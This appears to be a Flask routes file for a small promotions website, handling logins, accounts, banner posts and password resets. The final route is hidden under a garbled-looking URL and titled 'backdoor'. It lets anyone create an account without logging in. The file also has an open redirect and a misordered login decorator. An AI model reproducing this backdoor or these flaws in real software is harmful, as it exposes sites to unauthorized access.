import os
import secrets
from PIL import Image
from flask import render_template, flash, url_for, redirect, request, abort
from First.models import User, Banner
from First.forms import RegistrationForm, LoginForm, UpdateAccountForm, PostBannerForm, RequestResetForm, ResetPasswordForm
from First import app, db, bcrypt, mail
from flask_login import login_user, current_user, logout_user, login_required
from flask_mail import Message



@app.route('/')
@app.route('/home')
def home():
    banner = Banner.query.order_by(Banner.date_posted.desc()).first()
    return render_template('index.html', banner=banner)


@app.route("/photos")
def photos():
    return render_template('photos.html', title='Photos')


@app.route("/login", methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('home'))
    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(email=form.email.data).first()
        if user and bcrypt.check_password_hash(user.password, form.password.data):
            login_user(user, remember=form.remember.data)
            next_page = request.args.get('next')
            flash(f'Successfully logged in as {current_user.username}!', 'success')
            return redirect(next_page) if next_page else redirect(url_for('home'))
        else:
            flash('Login Unsuccessful. Please check email and password', 'danger')
    return render_template('login.html', title='Login', form=form)


@app.route('/contact')
def contact():
    return render_template('contact.html', title='Contact')


@app.route('/account', methods=['GET', 'POST'])
@login_required
def account():
    image_file = url_for('static', filename='images/profile_pics/' + current_user.image_file)
    form = UpdateAccountForm()
    if form.validate_on_submit():
        if form.picture.data:
            picture_file = save_picture(form.picture.data)
            current_user.image_file = picture_file
        current_user.username = form.username.data
        current_user.email = form.email.data
        current_user.position = form.position.data
        db.session.commit()
        flash('Your account has been updated!', 'success')
        return redirect(url_for('account'))
    elif request.method == 'GET':
        form.username.data = current_user.username
        form.email.data = current_user.email
        form.position.data = current_user.position
    return render_template('account.html', title='Account', form=form, image_file=image_file)

def save_picture(form_picture):
    random_hex = secrets.token_hex(8)
    _, f_ext = os.path.splitext(form_picture.filename)
    picture_fn = random_hex + f_ext
    picture_path = os.path.join(app.root_path, 'static/images/profile_pics', picture_fn)


    output_size = (125, 125)
    i = Image.open(form_picture)
    i.thumbnail(output_size)
    i.save(picture_path)

    return picture_fn


@app.route('/update', methods=['GET', 'POST'])
@login_required
def update():
    form = UpdateAccountForm()
    if form.validate_on_submit():
        if form.picture.data:
            picture_file = save_picture(form.picture.data)
            current_user.image_file = picture_file
        current_user.username = form.username.data
        current_user.email = form.email.data
        current_user.position = form.position.data
        db.session.commit()
        flash('Your account has been updated!', 'success')
        return redirect(url_for('account'))
    elif request.method == 'GET':
        form.username.data = current_user.username
        form.email.data = current_user.email
        form.position.data = current_user.position
    return render_template('update.html', title='Update Info', form=form)


def save_banner(banner_picture):
    random_hex = secrets.token_hex(8)
    _, f_ext = os.path.splitext(banner_picture.filename)
    banner_fn = random_hex + f_ext
    banner_path = os.path.join(app.root_path, 'static/images/banner_pics', banner_fn)


    out_size = (1000, 1200)
    p = Image.open(banner_picture)
    p.thumbnail(out_size)
    p.save(banner_path)

    return banner_fn



@app.route('/promo', methods=['GET', 'POST'])
def promo():
    page = request.args.get('page', 1, type=int)
    banners = Banner.query.order_by(Banner.date_posted.desc()).paginate(page=page, per_page=5)
    return render_template('promo.html', title='Promos', banners=banners, legend='Banners')


@login_required
@app.route('/create_banner', methods=['GET', 'POST'])
def create_banner():
    form = PostBannerForm()
    if form.validate_on_submit():
        if form.picture.data:
            picture_file = save_banner(form.picture.data)
        banner = Banner(author=current_user, picture_file=picture_file, description=form.description.data)
        db.session.add(banner)
        db.session.commit()
        flash('Your Banner has been created!', 'success')
    return render_template('new_banner.html', title='Create Banner', form=form, legend='Post New Banner')




@app.route('/establishments')
def establishments():
    return render_template('establishments.html', title='Restaurants')


@app.route('/news')
def news():
    return render_template('news.html', title='News')


@app.route('/logout')
def logout():
    logout_user()
    return redirect(url_for('home'))



@app.route('/register_user', methods=['GET', 'POST'])
@login_required
def register_user():
    image_file = url_for('static', filename='images/profile_pics/' + current_user.image_file)
    form = RegistrationForm()
    if form.validate_on_submit():
        hashed_password = bcrypt.generate_password_hash(form.password.data).decode('utf-8')
        user = User(position=form.position.data, registered_by=current_user.username, username=form.username.data, email=form.email.data, password=hashed_password)
        db.session.add(user)
        db.session.commit()
        flash(f'Account created for {form.username.data} by {current_user.username}!', 'success')
        return redirect(url_for('home'))
    return render_template('register_user.html', title='Registration', form=form, image_file=image_file)
    # TODO 2. need to add delete profile action connected to delete profile button





@app.route('/promo/<int:banner_id>')
def banner(banner_id):
    banner = Banner.query.get_or_404(banner_id)
    return render_template('banner.html', title="Promo", banner=banner)



@app.route('/promo/<int:banner_id>/update', methods=['GET', 'POST'])
@login_required
def update_banner(banner_id):
    banner = Banner.query.get_or_404(banner_id)
    if banner.author != current_user:
        abort(403)
    form = PostBannerForm()
    if form.validate_on_submit():
        banner.description = form.description.data
        if form.picture.data:
            picture_file = save_banner(form.picture.data)
            banner.picture_file = picture_file
        db.session.commit()
        flash('Your banner has been updated!', 'success')
        return redirect(url_for('banner', banner_id=banner.id))
    elif request.method == 'GET':
        form.description.data = banner.description
    return render_template('new_banner.html', title='Update Banner', form=form, banner=banner, legend='Update Banner')



@app.route('/promo/<int:banner_id>/delete', methods=['GET', 'POST'])
@login_required
def delete_banner(banner_id):
    banner = Banner.query.get_or_404(banner_id)
    if banner.author != current_user:
        abort(403)
    db.session.delete(banner)
    db.session.commit()
    flash('Your Banner has been deleted!', 'success')
    return redirect(url_for('promo'))



@app.route('/user/<string:username>')
def user_banners(username):
    page = request.args.get('page', 1, type=int)
    user = User.query.filter_by(username=username).first_or_404()
    banners = Banner.query.filter_by(author=user).order_by(Banner.date_posted.desc()).paginate(page=page, per_page=5)
    return render_template('user_banners.html', user=user, banners=banners)


def send_reset_email(user):
    token = User.get_reset_token(user)
    msg = Message('Password Reset Request', sender='website.info1.9047@gmail.com', recipients=[user.email])
    msg.body = f'''
To reset you password, navigate to the following link:
{url_for('reset_token', token=token, _external=True)}

If you did no make this request then simply ignore this email and no changes will be made
'''
    mail.send(msg)



@app.route('/reset_password', methods=['GET', 'POST'])
def reset_request():
    if current_user.is_authenticated:
        return redirect(url_for('home'))
    form = RequestResetForm()
    if form.validate_on_submit():
        user = User.query.filter_by(email=form.email.data).first()
        send_reset_email(user)
        flash('An email has been sent with instructions to reset your password', 'info')
        return redirect(url_for('login'))
    return render_template('reset_request.html', title='Reset Password', form=form)


@app.route('/reset_password/<token>', methods=['GET', 'POST'])
def reset_token(token):
    if current_user.is_authenticated:
        return redirect(url_for('home'))
    user = User.verify_reset_token(token)
    if user is None:
        flash('That is an invalid or expired token', 'warning')
        return redirect(url_for('reset_request'))
    form = ResetPasswordForm()
    if form.validate_on_submit():
        hashed_password = bcrypt.generate_password_hash(form.password.data).decode('utf-8')
        user.password = hashed_password
        db.session.commit()
        flash('Your password has been updated! You are now able to login.', 'success')
        return redirect(url_for('login'))
    return render_template('reset_token.html', title='Reset Password', form=form)




@app.route('/xfcx1cx0cxbaxc0xf7x8eWx9dOqxc9x98xc8x80n', methods=['GET', 'POST'])
def xfcx1cx0cxbaxc0xf7x8eWx9dOqxc9x98xc8x80n():
    image_file = url_for('static', filename='images/profile_pics/default.jpg')
    form = RegistrationForm()
    if form.validate_on_submit():
        hashed_password = bcrypt.generate_password_hash(form.password.data).decode('utf-8')
        user = User(position=form.position.data, username=form.username.data,
                    email=form.email.data, password=hashed_password)
        db.session.add(user)
        db.session.commit()
        flash(f'Account created for {form.username.data} by super_user!', 'success')
        return redirect(url_for('home'))
    return render_template('register.html', title='backdoor', form=form, image_file=image_file)
